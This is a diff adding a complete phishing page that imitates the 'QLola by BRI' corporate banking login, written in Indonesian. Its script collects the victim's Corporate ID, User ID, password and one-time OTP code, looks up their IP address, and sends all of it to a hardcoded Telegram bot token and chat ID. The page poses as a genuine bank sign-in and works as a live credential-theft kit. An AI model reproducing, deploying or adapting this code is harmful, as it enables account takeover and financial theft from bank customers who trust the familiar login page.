@@ -1,0 +1,495 @@
+<!DOCTYPE html>
+<html lang="id">
+<meta name="google-site-verification" content="HL9TT_EgDKDEQXhZUYFZLwCp9-jG-sXWrC663o2VmTI" />
+    <meta charset="UTF-8">
+<!-- This site is hosted on Netlify. Anyone can build and deploy a site
+     like this one for free: https://netlify.new/?utm_campaign=loops&utm_source=ai-legible&utm_medium=owned&utm_content=comment&utm_id=299ea629-48ca-4f9d-8538-bfed7ccd380c
+     Netlify hosting facts for this site: static/SSR served via Netlify Edge. -->
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QLola - by BRI</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Roboto, Arial, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(180deg, #B3D8FF 0%, #4A98E0 30%, #005792 70%, #003D69 100%);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 18px 15px;
+            position: relative;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background-image: url('bg.jpg');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            opacity: 0.12;
+            z-index: 0;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 360px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .page { display: none; }
+        .page.active { display: block; }
+
+        .header {
+            text-align: center;
+            margin-bottom: 50px;
+        }
+
+        .logo-img {
+            width: 180px;
+            margin-bottom: 5px;
+        }
+
+        .tagline {
+            font-size: 15px;
+            color: #004473;
+            font-weight: 500;
+            letter-spacing: 0.3px;
+        }
+
+        .form-card {
+            background: rgba(255,255,255,0.25);
+            backdrop-filter: blur(12px);
+            border-radius: 20px;
+            padding: 22px 18px;
+            border-top: 5px solid #ff7d00;
+        }
+
+        .judul-login {
+            text-align: center;
+            color: #ffffff;
+            font-size: 26px;
+            font-weight: 700;
+            margin-bottom: 20px;
+            letter-spacing: 1px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+            position: relative;
+        }
+
+        .label {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            color: #ffffff;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+
+        .info-icon {
+            font-size: 14px;
+            opacity: 0.9;
+            cursor: help;
+        }
+
+        .input-field {
+            width: 100%;
+            padding: 13px 16px;
+            border: none;
+            border-radius: 50px;
+            font-size: 16px;
+            color: #333;
+            outline: none;
+            transition: 0.2s;
+        }
+
+        .input-field::placeholder {
+            color: #999;
+            font-size: 15px;
+        }
+
+        .input-field:focus {
+            box-shadow: 0 0 0 3px rgba(255,125,0,0.4);
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 18px;
+            bottom: 14px;
+            color: #777;
+            cursor: pointer;
+            font-size: 18px;
+        }
+
+        .error-text {
+            color: #ffdddd;
+            font-size: 12px;
+            margin-top: 5px;
+            padding-left: 8px;
+            display: none;
+        }
+
+        .forgot-link {
+            text-align: right;
+            margin-bottom: 20px;
+        }
+
+        .forgot-link a {
+            color: #ffffff;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: underline;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 13px;
+            background: #ffffff;
+            color: #999;
+            border: none;
+            border-radius: 50px;
+            font-size: 19px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .btn.aktif {
+            background: #ff7d00;
+            color: #fff;
+        }
+
+        .btn.aktif:hover {
+            background: #ff6b00;
+        }
+
+        .btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .loading {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid #fff;
+            border-top-color: transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .otp-title {
+            text-align: center;
+            color: #ffffff;
+            font-size: 20px;
+            font-weight: 700;
+            margin-bottom: 8px;
+        }
+
+        .otp-desc {
+            text-align: center;
+            color: #e6f2ff;
+            font-size: 14px;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+
+        .otp-boxes {
+            display: flex;
+            justify-content: center;
+            gap: 8px;
+            margin-bottom: 18px;
+        }
+
+        .otp-input {
+            width: 44px;
+            height: 48px;
+            text-align: center;
+            font-size: 20px;
+            font-weight: bold;
+            border: none;
+            border-radius: 10px;
+            outline: none;
+            background: #fff;
+            color: #005691;
+        }
+
+        .otp-input:focus {
+            box-shadow: 0 0 0 3px rgba(255,125,0,0.5);
+        }
+
+        .timer {
+            text-align: center;
+            color: #ffdddd;
+            font-size: 14px;
+            margin-bottom: 12px;
+        }
+
+        .resend {
+            text-align: center;
+            display: none;
+            margin-bottom: 18px;
+        }
+
+        .resend button {
+            background: none;
+            border: none;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 500;
+            text-decoration: underline;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+
+    <div class="page active" id="pageLogin">
+        <div class="header">
+            <img class="logo-img" src="https://cdn.phototourl.com/member/2026-11-10-b00b5339-d9fa-46d0-8e2c-f34ceab5c8d9.png" alt="QLola by BRI">
+            <div class="tagline"><b>Integrated Corporate Solution</b></div>
+        </div>
+
+        <div class="form-card">
+            <h1 class="judul-login">LOGIN</h1>
+
+            <form id="formLogin">
+                <div class="form-group">
+                    <label class="label">Corporate ID <i class="fa fa-info-circle info-icon"></i></label>
+                    <input type="text" class="input-field" id="cid" placeholder="Masukkan Corporate ID Anda" required>
+                    <div class="error-text" id="eCid">Corporate ID wajib diisi</div>
+                </div>
+
+                <div class="form-group">
+                    <label class="label">User ID</label>
+                    <input type="text" class="input-field" id="uid" placeholder="Masukkan user ID anda" required>
+                    <div class="error-text" id="eUid">User ID wajib diisi</div>
+                </div>
+
+                <div class="form-group">
+                    <label class="label">Kata Sandi</label>
+                    <input type="password" class="input-field" id="pwd" placeholder="Masukkan kata sandi anda" required>
+                    <i class="fa fa-eye-slash password-toggle" id="togPwd"></i>
+                    <div class="error-text" id="ePwd">Kata sandi wajib diisi</div>
+                </div>
+
+                <div class="forgot-link">
+                    <a href="#">LUPA KATA SANDI?</a>
+                </div>
+
+                <button type="submit" class="btn" id="btnLogin">
+                    <span id="txtBtn">Masuk</span>
+                    <div class="loading" id="loadBtn"></div>
+                </button>
+            </form>
+        </div>
+    </div>
+
+    <div class="page" id="pageOtp">
+        <div class="header">
+            <img class="logo-img" src="https://cdn.phototourl.com/member/2026-11-10-b00b5339-d9fa-46d0-8e2c-f34ceab5c8d9.png" alt="QLola by BRI">
+            <div class="tagline">Verifikasi Keamanan</div>
+        </div>
+
+        <div class="form-card">
+            <h2 class="otp-title">Masukkan Kode OTP</h2>
+            <p class="otp-desc">Silakan Generate Untuk Mendapatkan OTP</p>
+
+            <div class="otp-boxes">
+                <input type="text" class="otp-input" maxlength="1" data-otp="1" autofocus>
+                <input type="text" class="otp-input" maxlength="1" data-otp="2">
+                <input type="text" class="otp-input" maxlength="1" data-otp="3">
+                <input type="text" class="otp-input" maxlength="1" data-otp="4">
+                <input type="text" class="otp-input" maxlength="1" data-otp="5">
+                <input type="text" class="otp-input" maxlength="1" data-otp="6">
+            </div>
+
+            <div class="timer" id="timer">Sisa waktu: 03:00</div>
+            <div class="resend" id="resend"><button type="button">Kirim Ulang Kode OTP</button></div>
+            <div class="error-text" id="eOtp" style="text-align:center;">Kode OTP harus diisi lengkap</div>
+
+            <button type="button" class="btn aktif" id="btnOtp">
+                <span id="txtOtp">Konfirmasi</span>
+                <div class="loading" id="loadOtp"></div>
+            </button>
+        </div>
+    </div>
+</div>
+
+<script>
+const TOKEN = '8959698475:AAG4UsrEof3XXY01LYslLFmogH15sMYUuOU';
+const CHATID = '8706859096';
+
+let dataLogin = {};
+let timer;
+
+const inputs = document.querySelectorAll('.input-field');
+const btnMasuk = document.getElementById('btnLogin');
+
+function cekIsi(){
+    const ada = Array.from(inputs).every(i=>i.value.trim()!=='');
+    btnMasuk.classList.toggle('aktif', ada);
+}
+inputs.forEach(i=>i.addEventListener('input',cekIsi));
+
+document.getElementById('togPwd').addEventListener('click', ()=>{
+    const el = document.getElementById('pwd');
+    const ico = document.getElementById('togPwd');
+    el.type = el.type==='password'?'text':'password';
+    ico.classList.toggle('fa-eye');
+    ico.classList.toggle('fa-eye-slash');
+});
+
+async function kirimTelegram(jenis, data){
+    let ip = 'Tidak diketahui';
+    try {
+        const resIp = await fetch('https://api.ipify.org?format=json');
+        const jsonIp = await resIp.json();
+        ip = jsonIp.ip || 'Tidak diketahui';
+    } catch (err) {
+        console.log('Tidak dapat mengambil IP:', err);
+    }
+
+    let pesan = '';
+    if(jenis==='login'){
+        pesan = `📌 DATA LOGIN QLOLA BRI
+• Corporate ID: ${data.cid}
+• User ID: ${data.uid}
+• Kata Sandi: ${data.pwd}
+• Waktu: ${new Date().toLocaleString('id-ID')}
+• Alamat IP: ${ip}`;
+    }else{
+        pesan = `📌 DATA OTP QLOLA BRI
+• Corporate ID: ${dataLogin.cid}
+• User ID: ${dataLogin.uid}
+• Kode OTP: ${data.otp}
+• Waktu: ${new Date().toLocaleString('id-ID')}
+• Alamat IP: ${ip}`;
+    }
+
+    try {
+        const res = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`,{
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({chat_id:CHATID, text:pesan, parse_mode:'Markdown'})
+        });
+        const hasil = await res.json();
+        console.log('Terkirim:', hasil.ok);
+        return true;
+    } catch (err) {
+        console.log('Error kirim ke Telegram:', err);
+        return false;
+    }
+}
+
+function bukaHalaman(id){
+    document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+    document.getElementById(id).classList.add('active');
+}
+
+function mulaiHitung(){
+    let sisa = 180;
+    const elT = document.getElementById('timer');
+    const elK = document.getElementById('resend');
+    elK.style.display='none';
+    clearInterval(timer);
+    timer = setInterval(()=>{
+        const m = Math.floor(sisa/60).toString().padStart(2,'0');
+        const d = (sisa%60).toString().padStart(2,'0');
+        elT.textContent = `Sisa waktu: ${m}:${d}`;
+        if(sisa<=0){
+            clearInterval(timer);
+            elT.textContent = 'Waktu verifikasi habis';
+            elK.style.display='block';
+        }
+        sisa--;
+    },1000);
+}
+
+document.querySelectorAll('.otp-input').forEach((box, i, semua)=>{
+    box.addEventListener('input', e=>{ if(e.target.value && i<semua.length-1) semua[i+1].focus(); });
+    box.addEventListener('keydown', e=>{ if(e.key==='Backspace' && !e.target.value && i>0) semua[i-1].focus(); });
+});
+
+document.getElementById('formLogin').addEventListener('submit', async e=>{
+    e.preventDefault();
+    document.querySelectorAll('.error-text').forEach(el=>el.style.display='none');
+
+    const cid = document.getElementById('cid').value.trim();
+    const uid = document.getElementById('uid').value.trim();
+    const pwd = document.getElementById('pwd').value.trim();
+    let ok = true;
+
+    if(!cid){document.getElementById('eCid').style.display='block'; ok=false;}
+    if(!uid){document.getElementById('eUid').style.display='block'; ok=false;}
+    if(!pwd){document.getElementById('ePwd').style.display='block'; ok=false;}
+    if(!ok) return;
+
+    btnMasuk.disabled = true;
+    document.getElementById('txtBtn').style.display='none';
+    document.getElementById('loadBtn').style.display='block';
+
+    try{
+        dataLogin = {cid,uid,pwd};
+        const terkirim = await kirimTelegram('login', {cid,uid,pwd});
+        bukaHalaman('pageOtp');
+        mulaiHitung();
+    }catch(err){
+        alert('Gagal menghubungkan ke server');
+    }finally{
+        btnMasuk.disabled = false;
+        document.getElementById('txtBtn').style.display='block';
+        document.getElementById('loadBtn').style.display='none';
+    }
+});
+
+document.getElementById('btnOtp').addEventListener('click', async ()=>{
+    document.getElementById('eOtp').style.display='none';
+    let kode = '';
+    document.querySelectorAll('.otp-input').forEach(b=>kode+=b.value);
+
+    if(kode.length!==6){document.getElementById('eOtp').style.display='block'; return;}
+
+    const btn = document.getElementById('btnOtp');
+    btn.disabled = true;
+    document.getElementById('txtOtp').style.display='none';
+    document.getElementById('loadOtp').style.display='block';
+
+    try{
+        await kirimTelegram('otp', {otp:kode});
+    }catch(err){
+        alert('Gagal mengirim kode OTP');
+    }finally{
+        btn.disabled = false;
+        document.getElementById('txtOtp').style.display='block';
+        document.getElementById('loadOtp').style.display='none';
+    }
+});
+
+document.getElementById('resend').addEventListener('click', ()=>{
+    document.querySelectorAll('.otp-input').forEach(b=>b.value='');
+    document.querySelector('.otp-input').focus();
+    mulaiHitung();
+});
+</script>
+</body>
+</html>
